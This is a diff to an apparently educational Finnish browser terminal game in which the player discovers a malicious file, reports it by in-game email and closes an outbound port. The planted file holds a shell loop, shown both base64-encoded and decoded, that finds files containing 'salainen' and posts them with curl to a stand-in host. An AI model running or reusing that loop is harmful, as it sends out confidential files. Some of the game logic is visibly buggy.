@@ -3,6 +3,8 @@ var systemOnlineMgmt = false;
 var systemOnlineWow = false;
 var hackcheck = false;
 var fix = false;
+var send_msg = false;
+var new_msg = false;
 var security = false;
 
 $('body').terminal({
@@ -10,11 +12,20 @@ $('body').terminal({
         if(systemOnlineHome == false && systemOnlineMgmt == false && systemOnlineWow == false){
             this.echo("help-komento esittelee ls- ja cat-komennot. Tehtävänä on yhdistää tietoturvahallinnon verkkoyhteyteen. Tarvittavat tiedot voidaan lukea\ncat-komennolla tiedostoista.\n")
         }
-        if(systemOnlineMgmt == true && hackcheck == false && fix == false && security == false) {
+        else if(systemOnlineMgmt == true && hackcheck == false && fix == false && security == false && send_msg == false && new_msg == false){
             this.echo("HackCheckPro ohjelma saattaa löytää jotain. Kirjoita HackCheckPro ja paina Enter.")
         }
-        if(systemOnlineMgmt == true && hackcheck == true && fix == false && security == false){
-            this.echo("HackCheckPro löysi jotain!")
+        else if(systemOnlineMgmt == true && hackcheck == true && fix == false && security == false && send_msg == false && new_msg == false){
+            this.echo("HackCheckPro löysi jotain! Mikäköhän tiedosto on kyseessä? Ehkä FileChecker saa selville jotain.")
+        }
+        else if(systemOnlineMgmt == true && hackcheck == true && fix == true && security == false && send_msg == false && new_msg == false){
+            this.echo("Tästä kannattaa lähettää viestiä pomolle.")
+        }
+        else if(systemOnlineMgmt == true && hackcheck == true && fix == true && security == false && send_msg == true && new_msg == false){
+            this.echo("Mitäköhän pomo vastasi?")
+        }
+        else if(systemOnlineMgmt == true && hackcheck == true && fix == true && security == false && send_msg == true && new_msg == true){
+            this.echo("Suoritetaan SecuritySetup pomon ohjeiden mukaan.")
         }
     },
     help: function() {
@@ -35,13 +46,13 @@ $('body').terminal({
             this.echo("PELIJUTUT:\npeli_strategia_ohjeet.exe\nWorldOfWarcraft\nDiscord\n")
         }
         if (systemOnlineMgmt == true && hackcheck == false){
-            this.echo("HOME:\nKorjausohje\n\nSYSTEM CONTROL TOOLS:\nHackCheckPro\nSecuritySetUp\nFileChecker\n")
+            this.echo("HOME:\nKorjausohje\nEmail\n\nSYSTEM CONTROL TOOLS:\nHackCheckPro\nSecuritySetUp\nFileChecker\n")
         }
         if (hackcheck == true && fix == false){
-            this.echo("HOME:\nKorjausohje\n(Uusi) lolh4x\n\nSYSTEM CONTROL TOOLS:\nHackCheckPro\nSecuritySetup\nFileChecker\n")
+            this.echo("HOME:\nKorjausohje\nEmail\n(Uusi) lolh4x\n\nSYSTEM CONTROL TOOLS:\nHackCheckPro\nSecuritySetup\nFileChecker\n")
         }
         if (hackcheck == true && fix == true){
-            this.echo("HOME:\nKorjausohje\nlolh4x\n\nSYSTEM CONTROL TOOLS:\nHackCheckPro\nSecuritySetup\nFileChecker\n")
+            this.echo("HOME:\nKorjausohje\nEmail\nlolh4x\n\nSYSTEM CONTROL TOOLS:\nHackCheckPro\nSecuritySetup\nFileChecker\n")
         }
     }, 
     cat: function(what) {
@@ -59,8 +70,11 @@ $('body').terminal({
             } else if (what == "lolh4x" && fix == false){ 
                 this.echo("I2l0ZXJvaWRhYW4gZXJpbGxpc2V0IG9iamVrdGl0IGtva\nHRlZXNzYSwgam9rYSBtYWFyaXRlbGxhYW4gZmluZCBrb2\n1lbm5vbGxhLiBmaW5kIGtvbWVudG8gZXRzaWkgc3Blc2l\nmaXN0aSB0aWVkb3N0b2phLgpmb3IgZmlsZSBpbiAkKGZp\nbmQgLiAtdHlwZSBmKTsgZG8KICAgICNncmVwaWxsYSBoY\nWV0YWFuIGthaWtpc3RhIGFsaWthbnNpb2lzdGEgInNhbG\nFpbmVuIiAgdGVybWlhIGZpbmRpbiBsb3l0YW1pc3RhIG9\niamVrdGVpc3RhLgogICAgaWYgZ3JlcCAtcSAic2FsYWlu\nZW4iICRmaWxlOyB0aGVuCiAgICAgICAgZXhlYyAoY3Vyb\nCAkZmlsZSBodHRwczovL3Ryb2xsaXNpdnUubmV0KQogIC\nAgZmkKZG9uZQ==")
             } else if (what == "lolh4x" && fix == true) {
-                this.echo("#iteroidaan erilliset objektit kohteessa, joka määritellään find komennolla.\n find komento etsii spesifisti tiedostoja.\nfor file in $(find . -type f); do\n#grepillä haetaan kaikista alikansioista \"salainen\"\n  termiä findin löytämistä objekteista.\nif grep -q \"salainen\" $file; then\nexec (curl -d $file https://trollisivu.net)\nfi\ndone")
-            } else if (what == null) {
+                this.echo("#iteroidaan erilliset objektit kohteessa, joka määritellään find komennolla.\n find komento etsii spesifisti tiedostoja.\nfor file in $(find . -type f); do\n#grepillä haetaan kaikista alikansioista \"salainen\"\n  termiä ja lähetetään ne portista 3444.\nif grep -q \"salainen\" $file; then\nexec (curl -d $file https://trollisivu.net)\nfi\ndone")
+            } else if (what == "Email" || what == "HackCheckPro" || what == "SecuritySetup" || what == "FileChecker"){
+                this.echo("Kohde ei ole tiedosto.")
+            }
+             else if (what == null) {
                 this.echo("Väärin meni. Tulosta ohjeet 'help'-komennolla.")
             } else {
                 this.echo("Väärin meni. Tulosta ohjeet 'help'-komennolla.");
@@ -264,7 +278,7 @@ $('body').terminal({
             if (timeout == 21) {
                 stopAnimation();
                 this.echo("\nKorjaus valmis")
-                this.echo("Tiedosto lolh4x korjattu.")
+                this.echo("Tiedosto lolh4x tarkistettu.")
                 this.echo("Tiedoston sisältö päivitetty.\n")
             };
             }.bind(this);
@@ -282,39 +296,128 @@ $('body').terminal({
             this.echo("lol")
         }
     },
-    SecuritySetup: function(what) {
-        this.echo("\nTervetuloa SecuritySetup -tietoturvajärjestelmään!!\n")
-        this.echo("\n1 - Choice 1\n2 - Choice 2\n3 - Choice 3\n4 - Choice 4\n5 - Choice 5\n0 - Choice 0")
-        this.echo("\nHallinnoi tietoturva-asetuksia valitsemalla toiminnon numero, ja painamalla enter.\n")
-        var selection = {}
-        this.push(function(command) {
-            switch (command) {
-                case "1":
-                    this.echo("lolmoi")
-                    selection.case="1";
-                    break;
-                case "2":
-                    selection.case="2";
-                    break;
-                case "3":
-                    selection.case="3";
-                    break;
-                case "4":
-                    selection.case="4";
-                    break;
-                case "5":
-                    break;
-                case "0":
-                    this.echo("Suljetaan SecuritySetup.\n")
-                    break;
-                default:
-                    this.echo("testi")
-                    break;
+    Email: function(what){
+        if (send_msg == false && new_msg == false){
+            this.echo("1. Ohjeet\n2. Uusi viesti\n3. Saapuneet viestit\n4. Poistu\n")
+        } else if (send_msg == true && new_msg == true) {
+            this.echo("1. Ohjeet\n2. Uusi viesti\n3. Saapuneet viestit (1)\n4. Poistu\n")
+        }
+        var inbox = [];
+        var selection = {};
+          this.push(function(command) {
+            if (command === "1" || command.toLowerCase() === "instructions") {
+              this.echo("Ohjeet:\n1. Uusi Viesti:\n- Syötä vastaanottaja yhteystiedoista.\n- Syötä liitetiedoston nimi.\n- Kirjoita viesti.\n2. Saapuneet viestit:\n- Valitse viestin numero."); // Display instructions
+              this.resume();
+            } else if (command === "2" || command.toLowerCase() === "new message") {
+              this.echo("Uusi viesti")
+              this.push(function(command) {
+                var recipient = command;
+                selection.recipient = command; // Get recipient input
+                this.pop();
+                this.push(function(command) {
+                  var subject = command;
+                  selection.subject = command; // Get subject input
+                  this.pop();
+                  this.push(function(command) {
+                    var body = command;
+                    this.pop();
+                    this.echo("Viesti lähetetty");
+                    send_msg == true;
+                    if(selection == "pomo" || recipient == "Pomo" && subject == "lolh4x")
+                        setTimeout(function() {
+                            inbox.push({
+                              recipient: "Tietoturvavastaava",
+                              subject: "lolh4x",
+                              body: "Loistavaa työtä! SecuritySetup korjaa altistuneen järjestelmän.\nKäynnistä ohjelma ja estä uloslähtevä liikenne portista 3444.\n"
+                            });
+                            // Display "Message Received" after 10 seconds
+                            this.echo("Email: Uusi viesti saapunut. Lähettäjä: Pomo. Avataan viesti....\n");
+                            this.echo("From: Pomo\nTo: Tietoturvavastaava\nViesti: Loistavaa työtä! SecuritySetup korjaa altistuneen järjestelmän.\nKäynnistä ohjelma ja estä uloslähtevä liikenne portista 3444.\n")
+                            new_msg = true;
+                          }.bind(this), 7000);
+                    this.pop();
+                  }, {
+                    prompt: 'Viesti: '
+                  });
+                }, {
+                  prompt: 'Tiedoston nimi (tiedostot: Korjausohje / lolh4x): '
+                });
+              }, {
+                prompt: 'Vastaanottaja (yhteystiedot: Pomo / Jatta / William): '
+              });
+            } else if (command === "3" || command.toLowerCase() === "inbox") {
+              if (new_msg == true){
+                if (inbox.length === 0) {
+                    this.echo("0 viestiä."); // Display empty inbox message
+                  } else {
+                    // Display inbox messages
+                    inbox.forEach(function(message) {
+                      this.echo("Lähettäjä: " + message.recipient);
+                      this.echo("Aihe: " + message.subject);
+                      this.echo("Viesti: " + message.body);
+                      this.echo("-------------------------");
+                    }.bind(this));
+                  }
+                  this.pop(); // Resume terminal input
+              }
+              this.pop(); // Resume terminal input
+            } else if (command === "4" || command.toLowerCase() === "quit") {
+              this.echo("Poistutaan~"); // Display quitting message
+              this.resume(); // Resume terminal input
+            } else {
+              this.echo("Virheellinen valinta. Valitse toiminto 1-4."); // Display error message for invalid input
+              this.resume();
             }
-            self.pop(); // Pop the prompt from the terminal stack after input is processed
-        }, {
-            prompt: 'lkm '
-        });
+          }, {
+            prompt: 'Valitse toiminto (1-4): '
+          });
+        },
+    SecuritySetup: function(what) {
+        
+        var openPorts = {
+            80: true,
+            1112: false,
+            3444: true
+          };
+          
+          this.echo("=== Security Setup ===");
+          this.echo("1. Hallinnoi liikennettä");
+          this.echo("2. Palomuuri");
+          this.echo("3. Tarkista levy");
+        
+          this.push(function(command) {
+            if (command === "1") {
+              this.echo("=== Avoimet Portit ===");
+              for (var port in openPorts) {
+                this.echo(port + ": " + (openPorts[port] ? "ON" : "OFF"));
+              }
+              
+              this.push(function(portCommand) {
+                if (openPorts.hasOwnProperty(portCommand)) {
+                  openPorts[portCommand] = !openPorts[portCommand];
+                  this.echo(portCommand + " toggled " + (openPorts[portCommand] ? "ON" : "OFF"))
+                  this.echo("DEMO SUORITETTU. ONNEKSI OLKOON! (salainen avain: kyberturvallisuuden_tulevaisuus)")
+                } else {
+                  this.error("Väärä porttivalinta. Kokeile uudelleen.");
+                }
+                this.pop();
+                this.pop();
+              }, {
+                prompt: "Mitä porttia haluat hallinnoida : "
+              });
+        
+            } else if (command === "2") {
+              // Palomuuri logic
+              this.echo("Palomuuri toiminnallinen.");
+            } else if (command === "3") {
+              // Tarkista levy logic
+              this.echo("Levyt kunnossa.");
+            } else {
+              this.error("Invalid option. Please try again.");
+            }
+          }, {
+            prompt: "Valitse toiminto (1, 2 tai 3): "
+          });
     }
 },{
     greetings: 'SYSTEM CONTROL\nhelp -komennolla lisäohjeita.\nvihje -komennolla vinkki.\nKirjoita komento ja paina Enter.\n',
